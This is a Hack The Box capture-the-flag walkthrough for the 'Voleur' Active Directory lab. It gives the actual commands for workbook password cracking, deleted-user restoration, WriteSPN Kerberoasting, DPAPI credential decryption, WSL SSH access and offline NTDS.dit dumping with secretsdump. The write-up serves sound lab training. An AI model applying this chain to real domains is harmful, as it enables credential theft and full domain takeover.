---
title: 'HTB Voleur: Complete Evidence-Led Walkthrough'
description: A Kerberos-only AD chain spanning an encrypted workbook, restored user, SPN abuse, DPAPI secrets, WSL and offline NTDS extraction.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Not recorded
tags:
- Hack The Box
- Active Directory
- Kerberos
- DPAPI
- Deleted Objects
- WSL
- NTDS
published: true
slug: htb-voleur
---

# Overview

**Machine:** Voleur  
**Platform:** Hack The Box  
**Publication format:** htb-voleur.md  

The AD environment required Kerberos authentication and had a substantial clock offset. The initial credential was valid even when NTLM-oriented tests failed.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Machine overview

| Item                | Value                                       |
|---------------------|---------------------------------------------|
| Machine             | Voleur (Hack The Box)                       |
| Platform            | Windows / Active Directory with WSL         |
| Domain              | `voleur.htb` / `VOLEUR.HTB`                 |
| Domain controller   | `dc.voleur.htb`                             |
| Initial IP          | `10.129.90.84`                              |
| IP after reset      | `10.129.90.95`                              |
| Initial credentials | `ryan.naylor` / `[REDACTED]`            |
| Result              | Domain Administrator access; flag retrieved |

Voleur is an assumed-breach machine. The chain runs through
Kerberos-only authentication, a password-protected Excel workbook, a
service-account SPN ACL, restoration of a deleted domain user, DPAPI
credential recovery, SSH access to a WSL environment, and offline
extraction of Active Directory credentials from backups.

> **Evidence note:** Most commands and outputs below were observed
> during the session. A few middle-stage commands were not retained
> verbatim; those are identified as such rather than presented as exact
> terminal history. The final flag value was not provided and is
> intentionally omitted.

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Reconnaissance and Kerberos setup

#### Port scan

The target initially used `10.129.90.84`; after restarting the box it
changed to `10.129.90.95`. The final scan was:

``` bash
export IP=10.129.90.95
sudo nmap -sT -sV -Pn \
  -p 53,88,135,139,389,445,464,5985,9389 \
  "$IP"
```

Observed services:

|     Port | Service  | Notes                          |
|---------:|----------|--------------------------------|
|   53/tcp | DNS      | Domain discovery / SRV records |
|   88/tcp | Kerberos | Authentication path            |
|  135/tcp | MSRPC    | Windows RPC                    |
|  139/tcp | NetBIOS  | SMB-related service            |
|  389/tcp | LDAP     | AD enumeration                 |
|  445/tcp | SMB      | Shares and remote file access  |
|  464/tcp | kpasswd5 | Kerberos password service      |
| 5985/tcp | WinRM    | PowerShell remoting endpoint   |
| 9389/tcp | ADWS     | Active Directory Web Services  |

A broader scan also found `636`, `3268`, and `3269` open.

#### NTLM is disabled

Initial password-based NetExec attempts failed:

``` bash
nxc ldap "$IP" -u 'ryan.naylor' -p '<REDACTED>' --users
nxc smb  "$IP" -u 'ryan.naylor' -p '<REDACTED>' --shares
```

The target reported `NTLM:False` and `STATUS_NOT_SUPPORTED`. This was a
protocol restriction, not proof that Ryan’s password was wrong. The
correct pivot was Kerberos.

#### DNS and hostname resolution

A reverse lookup timed out over the default transport:

``` bash
dig @10.129.90.95 -x 10.129.90.95
```

The Kerberos SRV query worked over TCP:

``` bash
dig +tcp @10.129.90.95 _kerberos._tcp.voleur.htb SRV
```

It returned `dc.voleur.htb` at `10.129.90.95`. The hosts file was
updated:

``` bash
echo '10.129.90.95 dc.voleur.htb voleur.htb' | sudo tee -a /etc/hosts
```

#### Clock skew

`sudo ntpdate -q "$IP"` reported an offset of approximately `+28770`
seconds - nearly eight hours. Kerberos operations therefore used
`faketime -f '+8h'`.

`~/Voleur/krb5.conf`:

``` ini
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    udp_preference_limit = 1

[realms]
    VOLEUR.HTB = {
        kdc = 10.129.90.95:88
        admin_server = 10.129.90.95
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

Set the local environment:

``` bash
cd ~/Voleur
export IP=10.129.90.95
export KRB5_CONFIG="$PWD/krb5.conf"
```

#### Ryan’s TGT and SMB shares

``` bash
faketime -f '+8h' impacket-getTGT \
  'VOLEUR.HTB/ryan.naylor' -dc-ip "$IP"
```

When prompted, enter `[REDACTED]`. Then:

``` bash
export KRB5CCNAME="$PWD/ryan.naylor.ccache"
faketime -f '+8h' nxc smb dc.voleur.htb --use-kcache --shares
```

Observed share access:

| Share           | Access shown                     |
|-----------------|----------------------------------|
| `IT`            | Read                             |
| `IPC$`          | Read                             |
| `NETLOGON`      | Read                             |
| `SYSVOL`        | Read                             |
| `Finance`, `HR` | Listed, no read permission shown |
| `ADMIN$`, `C$`  | Listed, no access shown          |

The readable `IT` share exposed `Access_Review.xlsx`.

## Analysis

Time synchronization allowed Kerberos-based enumeration of an IT share. A protected workbook contained identities that unlocked delegated object permissions, a deleted-user restoration, and targeted Kerberoasting. A DPAPI blob had to be decrypted in the appropriate context. A WSL backup account ultimately exposed offline AD database and registry hives, permitting Administrator authentication without assuming that DCSync was the performed mechanism.

### Attack-chain summary

1.  Use the supplied Ryan Naylor credentials and discover NTLM is
    disabled.
2.  Configure Kerberos and compensate for an approximately eight-hour
    clock offset.
3.  Authenticate with a TGT and enumerate the readable `IT` share.
4.  Crack the password for `Access_Review.xlsx`; recover `svc_ldap`,
    `svc_iis`, and Todd Wolfe credentials.
5.  Use `svc_ldap`’s delegated rights to inspect writable attributes and
    restore deleted `todd.wolfe`.
6.  Abuse `WriteSPN` on `svc_winrm`, crack its service ticket, and gain
    WinRM access.
7.  Decrypt Todd’s DPAPI master key and credential blob to recover
    Jeremy Combs’s password.
8.  Follow the WSL/backup note, use `id_rsa` to SSH as `svc_backup` on
    port `2222`, and locate the backup files.
9.  Extract `NTDS.dit`, `SYSTEM`, and `SECURITY`; use `secretsdump` to
    recover Administrator credential material.
10. Authenticate as Administrator and retrieve the flag.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Crack the Office workbook

`Access_Review.xlsx` was password-protected. Its hash was extracted with
Office2John and cracked with John the Ripper:

``` bash
office2john Access_Review.xlsx > access_review.hash
john --wordlist=/usr/share/wordlists/rockyou.txt access_review.hash
john --show access_review.hash
```

The workbook password itself was not retained in the captured terminal
history. The opened workbook yielded these credentials:

| Account      | Password             |
|--------------|----------------------|
| `svc_ldap`   | `[REDACTED]`     |
| `svc_iis`    | `[REDACTED]`     |
| `todd.wolfe` | `[REDACTED]` |

For example, a service-account TGT could be obtained with:

``` bash
faketime -f '+8h' impacket-getTGT \
  'VOLEUR.HTB/svc_ldap:[REDACTED]' -dc-ip "$IP"
```

The `svc_iis` credentials/cache were also tested, but `svc_ldap` was the
important account for the ACL investigation.

### AD ACL enumeration and deleted-user restoration

#### 1 `svc_ldap` and `Restore_Users`

Using the `svc_ldap` Kerberos cache:

``` bash
export KRB5CCNAME="$PWD/svc_ldap.ccache"
faketime -f '+8h' nxc ldap dc.voleur.htb \
  --use-kcache \
  --query '(cn=Restore_Users)' 'member distinguishedName'
```

The group contained `CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb`.
Detailed writable-attribute enumeration showed useful delegated
permissions, including `WriteSPN` on `svc_winrm`, as well as writable
attributes on Lacey Miller.

A BloodyAD command used for writable-attribute enumeration was:

``` bash
bloodyAD \
  -d voleur.htb -u svc_ldap -H dc.voleur.htb \
  -k "ccache=$PWD/svc_ldap.ccache" "kdc=$IP" \
  get writable --otype USER --detail
```

#### BloodHound troubleshooting and results

BloodHound collection ZIPs were created:

- `20261026095740_bloodhound.zip`
- `20261026110053_bloodhound.zip`

The local UI initially failed because the API backend could not connect
to PostgreSQL at `127.0.0.1:5432`. `pg_lsclusters` showed PostgreSQL
17’s `main` cluster was down. Attempting to start `15 main` failed
because that cluster did not exist. The issue was local tooling; it was
not a target-side error.

The resulting graphs showed:

- Todd Wolfe: `Domain Users`, `Remote Management Users`,
  `Second-Line Technicians`.
- Jeremy Combs: `Domain Users`, `Remote Management Users`,
  `Third-Line Technicians`.
- `svc_ldap` had `WriteSPN` over `svc_winrm`.

#### Find Todd’s tombstone

A fresh TGT request for Todd returned `KDC_ERR_C_PRINCIPAL_UNKNOWN`.
Instead of assuming a bad password, the deleted-object container was
queried:

``` bash
faketime -f '+8h' bloodyAD \
  -d voleur.htb -u svc_ldap -H dc.voleur.htb \
  -k "ccache=$PWD/svc_ldap.ccache" "kdc=$IP" \
  get search \
  --base 'CN=Deleted Objects,DC=voleur,DC=htb' \
  --filter '(isDeleted=TRUE)' \
  --attr 'name,sAMAccountName,distinguishedName,lastKnownParent,objectSid' \
  -c 1.2.840.113556.1.4.417
```

The relevant tombstone was:

``` text
CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,
CN=Deleted Objects,DC=voleur,DC=htb
```

Its metadata:

``` text
sAMAccountName: todd.wolfe
lastKnownParent: OU=Second-Line Support Technicians,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
```

Using the delegated restore path available to `svc_ldap`, Todd was
restored. The exact successful restore command was not preserved
verbatim. After restoration, LDAP returned Todd as
`CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb`, and
his membership in `Remote Management Users` was confirmed.

### Failed shadow-credentials attempt

The writable `msDS-KeyCredentialLink` attribute on Lacey Miller
suggested a shadow-credentials path. Certipy added a temporary key
credential, but TGT acquisition failed with:

``` text
KDC_ERR_PADATA_TYPE_NOSUPP
KDC has no support for padata type
```

Certipy restored Lacey’s original Key Credentials. This was a failed
avenue, not a successful compromise. It demonstrated that a writable
attribute does not guarantee that the required authentication mechanism
is supported.

### SPN abuse and WinRM access

#### Set an SPN on `svc_winrm`

BloodHound showed `svc_ldap` had `WriteSPN` on `svc_winrm`. A temporary
lab-only SPN was set:

``` text
HTTP/voleur-lab.invalid
```

The successful operation reported:

``` text
svc_winrm's servicePrincipalName has been updated
```

The first BloodyAD attempt used `add object`, which failed because that
subcommand was not supported by the installed version. The correct
operation was `set object`.

#### Request and crack the TGS

A service ticket was requested for `svc_winrm` and saved as
`svc_winrm.tgs`. The exact TGS-request command was not retained in the
transcript. The ticket was cracked to:

``` text
[REDACTED]
```

For a compatible `[REDACTED_KERBEROS_TICKET_HASH]` ticket, Hashcat mode 13100 is the
standard Kerberos 5 TGS-REP etype 23 mode:

``` bash
hashcat -m 13100 svc_winrm.tgs /usr/share/wordlists/rockyou.txt
```

#### WinRM session

The recovered credential opened a session as `voleur\svc_winrm`:

- Username: `svc_winrm`
- Password: <REDACTED>

`whoami /groups` showed `Remote Management Users`, `Users`, and other
standard groups. `whoami /priv` showed `SeMachineAccountPrivilege`,
`SeChangeNotifyPrivilege`, and `SeIncreaseWorkingSetPrivilege`.
`net group "Domain Admins" /domain` showed only `Administrator` as a
Domain Admin.

### WinRM enumeration and client-side dead ends

#### CIM queries were denied

These failed from the low-privileged WinRM session because the remote
CIM connection was denied:

``` powershell
Get-ScheduledTask
Get-NetTCPConnection -State Listen -LocalPort 2222
```

The fallback worked:

``` powershell
netstat -ano | findstr LISTENING
```

It revealed listeners on ports `22` and `2222`. PID `3116` was `sshd`;
PID `2020` owned the `2222` listener. `Get-Process -Id 2020` only
identified it as `svchost`, which did not explain the service by itself.

#### NTLM and Evil-WinRM compatibility issues

Several errors were client-side or protocol-related rather than proof of
bad credentials:

- NetExec WinRM reported an invalid NTLM challenge because NTLM was
  disabled.
- Evil-WinRM v3.5 rejected `-K` as an invalid option.
- Installing Evil-WinRM 4.1 initially failed because `readline-ext`
  could not find readline/libedit development headers.
- Evil-WinRM 4.1 later failed during GSSAPI negotiation with
  `Invalid token was supplied` or `Cannot contact any KDC` even though
  TGT acquisition and `kvno HTTP/dc.voleur.htb` could succeed.

The lesson is to test TGT acquisition, service-ticket acquisition, and
application-level authentication separately. A valid ticket does not
guarantee that a particular client library will complete WinRM
authentication.

#### Direct DPAPI access as `svc_winrm` was denied

Attempts to inspect Todd’s and Jeremy’s protected profile directories
from `svc_winrm` returned `Access is denied`. The successful route was
to inspect Todd’s own profile using his restored account’s SMB context
rather than keep pushing the same low-privileged Windows session.

### Todd’s DPAPI credential blob

#### Locate the files

Todd’s profile contained the credential blob:

``` text
C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\[REDACTED_HEX]
```

His `Protect` directory contained SID:

``` text
S-1-5-21-3927696377-1337352550-2781715495-1110
```

Inside it were the master-key file and supporting files:

``` text
08949382-134f-4c63-b93c-ce52efc0aa88
BK-VOLEUR
Preferred
```

`CREDHIST` was in the parent `Protect` directory. The GUID-named
master-key file was the one referenced by the credential blob.

#### Verify the GUID

The blob was 398 bytes. Its header was inspected with:

``` bash
xxd -g 1 -l 160 [REDACTED_HEX]
```

The embedded master-key GUID was `08949382-134f-4c63-b93c-ce52efc0aa88`,
matching the master-key filename. A script that scanned every byte
offset for a version-like value produced false positives; the correct
GUID came from parsing the actual header structure, not arbitrary
matching offsets.

#### Decrypt the master key

Todd’s password was `[REDACTED]`. The master key was decrypted
with:

``` bash
impacket-dpapi masterkey \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' \
  -password '[REDACTED]'
```

Impacket reported `Decrypted key with User Key (MD4 protected)` and
recovered this 64-byte key:

``` text
[REDACTED_TOKEN_CONTINUATION]
```

The key length was checked as 128 hex characters / 64 bytes.

#### Decrypt the credential blob

The first credential-decryption attempt returned
`ERROR: Padding is incorrect.` The GUID and key length were then
checked; both matched expectations. After correcting the
credential-decryption invocation/argument handling, the successful
output was:

``` text
Username : jeremy.combs
Unknown  : [REDACTED]
```

The recovered value was used as Jeremy Combs’s password:

- Username: `jeremy.combs`
- Password: <REDACTED>

The exact final successful `impacket-dpapi credential` command was not
preserved verbatim, so it is not represented as exact command history
here.

### Jeremy, WSL, and the backup account

BloodHound showed Jeremy in `Domain Users`, `Remote Management Users`,
and `Third-Line Technicians`. In the `IT` share’s `Software` folder,
`Note.txt.txt` contained:

``` text
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

This connected the support role to a partially configured WSL
environment and Linux backup tooling. An SSH private key, `id_rsa`, was
recovered to `~/Voleur/id_rsa`.

#### SSH on port 2222

The key was checked and restricted:

``` bash
cd ~/Voleur
chmod 600 id_rsa
ssh-keygen -y -f id_rsa
```

The successful SSH connection was:

``` bash
ssh -i ./id_rsa \
  -o IdentitiesOnly=yes \
  -p 2222 \
  svc_backup@10.129.90.95
```

The session opened as `svc_backup@DC`. The SSH client’s post-quantum
key-exchange warning was informational and did not prevent access.

#### Find the backups

From the WSL shell:

``` bash
find / -type f \
  \( -name 'ntds.dit' -o -name 'SYSTEM' -o -name 'SECURITY' \) \
  2>/dev/null
```

The files were found at:

``` text
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```

The `/mnt/c` paths exposed Windows files from the Linux subsystem. The
backup account could access all three copies.

#### Transfer hiccup

The first SCP attempt failed with:

``` text
scp: loot/SECURITY: No such file or directory
```

This was a remote-path issue, not a cryptographic or SSH-key issue. The
relative path did not resolve where expected. Checking `pwd` and
`ls -lah ~/loot/`, staging the files, and using the correct remote path
resolved it. The files were transferred to `~/Voleur/loot/` as
`ntds.dit`, `SYSTEM`, and `SECURITY`.

### Offline NTDS extraction

The three backup files were supplied to Impacket:

``` bash
cd ~/Voleur
impacket-secretsdump \
  -ntds ./loot/ntds.dit \
  -system ./loot/SYSTEM \
  -security ./loot/SECURITY \
  LOCAL | tee loot/secretsdump.txt
```

The command succeeded. Relevant output included:

``` text
[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] PEK # 0 found and decrypted: [REDACTED_HEX]
[*] Reading and decrypting hashes from ./loot/ntds.dit
```

#### Administrator’s recovered secrets

Administrator’s NT hash:

``` text
Administrator:500:[REDACTED_HEX]:[REDACTED_HEX]:::
```

- RID: `500`
- LM hash: `[REDACTED_HEX]` (empty LM hash)
- NT hash: `[REDACTED_HEX]`

Administrator’s Kerberos keys:

``` text
AES256: [REDACTED_HEX]
AES128: [REDACTED_HEX]
DES:    459d836b9edcd6b0
```

The AES256 key was the useful final credential material because NTLM was
disabled.

#### Other domain NT hashes

| Account         |  RID | NT hash                            |
|-----------------|-----:|------------------------------------|
| `Administrator` |  500 | `[REDACTED_HEX]` |
| `Guest`         |  501 | `[REDACTED_HEX]` |
| `DC$`           | 1000 | `[REDACTED_HEX]` |
| `krbtgt`        |  502 | `[REDACTED_HEX]` |
| `ryan.naylor`   | 1103 | `[REDACTED_HEX]` |
| `marie.bryant`  | 1104 | `[REDACTED_HEX]` |
| `lacey.miller`  | 1105 | `[REDACTED_HEX]` |
| `svc_ldap`      | 1106 | `[REDACTED_HEX]` |
| `svc_backup`    | 1107 | `[REDACTED_HEX]` |
| `svc_iis`       | 1108 | `[REDACTED_HEX]` |
| `jeremy.combs`  | 1109 | `[REDACTED_HEX]` |
| `svc_winrm`     | 1601 | `[REDACTED_HEX]` |

The dump also recovered machine-account secrets, `DPAPI_SYSTEM`, and
`NL$KM`. Those were not needed once Administrator’s AES key was
available. All extracted hashes and keys should be treated as sensitive
lab artifacts.

### Final Administrator authentication

The documented Kerberos path using the recovered AES256 key was:

``` bash
cd ~/Voleur
export IP=10.129.90.95
export KRB5_CONFIG="$PWD/krb5.conf"

faketime -f '+8h' impacket-getTGT \
  'VOLEUR.HTB/Administrator' \
  -aesKey '[REDACTED_HEX]' \
  -dc-ip "$IP"
```

Then use the ticket cache to verify SMB authentication:

``` bash
export KRB5CCNAME="$PWD/Administrator.ccache"
faketime -f '+8h' nxc smb dc.voleur.htb --use-kcache --shares
```

The user confirmed Administrator access and flag retrieval. The exact
final interactive command and flag value were not included in the
captured terminal history and are intentionally not fabricated.

### Mistakes, failed approaches, and lessons

#### NTLM failures were a protocol issue

`STATUS_NOT_SUPPORTED` plus `NTLM:False` meant repeated password-based
NTLM attempts were never going to work. Move to Kerberos instead of
treating every authentication failure as a bad password.

#### Reverse DNS timed out

A failed UDP reverse lookup did not mean DNS was dead. The TCP Kerberos
SRV query gave the hostname and KDC address needed for the next steps.

#### Target reset changed the IP

The target moved from `10.129.90.84` to `10.129.90.95`. Old
`/etc/hosts`, `krb5.conf`, and ticket assumptions then became suspect.
Revalidate the IP and KDC after every reset.

#### Clock skew complicated Kerberos

The offset was approximately eight hours. Wrap network Kerberos
operations with `faketime -f '+8h'`, but keep ticket acquisition,
service-ticket acquisition, and application authentication as separate
tests.

#### BloodHound’s local backend was down

The UI/API could not connect to PostgreSQL. `pg_lsclusters` revealed
PostgreSQL 17 was installed and its cluster was down; trying to start
PostgreSQL 15 failed because that cluster did not exist. This was a
local setup issue, not target evidence.

#### BloodyAD syntax was wrong on the first attempt

`bloodyAD add object` returned an invalid-choice error. Use the
installed version’s supported subcommands; `set object` was used for the
SPN modification.

#### Shadow credentials did not complete

Certipy changed Lacey’s key credential but PKINIT failed with
`KDC_ERR_PADATA_TYPE_NOSUPP`; Certipy restored the old value. Do not
count a primitive as a successful escalation unless the authentication
stage works too.

#### WinRM and CIM tooling failed independently

NetExec’s WinRM module expected NTLM; Evil-WinRM versions differed in
ticket-cache support; a gem build initially lacked readline headers; and
remote CIM queries were denied. Use `netstat` as a fallback and avoid
assuming a client error means the target credential is invalid.

#### Todd’s TGT failure was directory state

`KDC_ERR_C_PRINCIPAL_UNKNOWN` led to deleted-object enumeration, which
revealed Todd’s tombstone. The account needed restoring; changing
passwords or repeatedly requesting a TGT would not have solved the
missing principal.

#### DPAPI padding error needed structural validation

The first credential-decryption attempt failed with
`Padding is incorrect`. Checking the blob’s master-key GUID and the
64-byte key narrowed the issue to invocation/argument handling instead
of prompting a blind search for more keys.

#### SCP relative path failed

`loot/SECURITY` did not resolve on the remote host. Check `pwd` and the
staged files, then use the correct path. The SSH post-quantum warning
was unrelated to this missing-file error.

#### Follow evidence rather than brute-force the entire host

The WSL note gave a strong hypothesis. Searching for the exact trio
`ntds.dit`, `SYSTEM`, and `SECURITY` immediately located the useful
backup artifacts. The chain was solved by correlating clues, not by
brute-forcing every service.

## Impact

The source records Administrator authentication and flag retrieval. Some middle-stage command output and the literal flag were not retained.

### Evidence archive

The working directory included the following notable artifacts:

``` text
~/Voleur/
├── Access_Review.xlsx
├── access_review.hash
├── ryan.naylor.ccache
├── svc_ldap.ccache
├── svc_iis.ccache
├── svc_winrm.tgs
├── todd.wolfe.ccache
├── jeremy.combs.ccache
├── id_rsa
├── krb5.conf
├── 20261026095740_bloodhound.zip
├── 20261026110053_bloodhound.zip
└── loot/
    ├── ntds.dit
    ├── SYSTEM
    ├── SECURITY
    └── secretsdump.txt
```

Ticket caches, private keys, plaintext passwords, hashes, and NTDS
backups are sensitive. Keep them in the lab workspace with restrictive
permissions and remove them when no longer needed.

### Conclusion

Voleur was completed. The verified chain was:

**assumed breach → Kerberos → exposed workbook → delegated AD rights →
SPN abuse → `svc_winrm` → deleted-user restoration → DPAPI credential
recovery → WSL/SSH backup account → offline NTDS extraction →
Administrator credential material → flag.**

The most valuable lessons were to diagnose authentication failures by
layer, refresh IP/KDC configuration after a reset, look for deleted
objects when a principal unexpectedly disappears, and let contextual
evidence guide the next enumeration step. Voleur rewarded careful
chaining and disciplined troubleshooting rather than one isolated
exploit.

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Technical takeaways

- **Kerberos-first AD enumeration:** When NTLM is disabled, get the
  realm, KDC, DNS resolution, clock offset, and ticket cache right
  early.
- **Document identity provenance:** Track which credential unlocked
  which share, LDAP query, SPN change, profile, and host.
- **Inspect attribute-level ACLs:** `WriteSPN` can enable targeted
  Kerberoasting even when the account is not privileged in a
  group-membership sense.
- **Check deleted objects:** A known account can disappear from the
  active directory while its tombstone and restoration path remain
  useful.
- **DPAPI needs multiple matching pieces:** The blob, master-key GUID,
  SID, user password, and correct key argument must align.
- **Contextual files matter:** The WSL note explained the port 2222 SSH
  listener and pointed to the backup workflow.
- **Offline AD extraction is decisive:** `NTDS.dit` plus the matching
  SYSTEM hive and SECURITY backup allowed recovery of the
  Administrator’s NT and Kerberos keys.
- **Separate tool failures from target failures:** NetExec, Samba,
  Evil-WinRM, CIM, BloodHound, and SCP each failed for different
  reasons. Changing tools or isolating the failing layer preserved
  momentum.
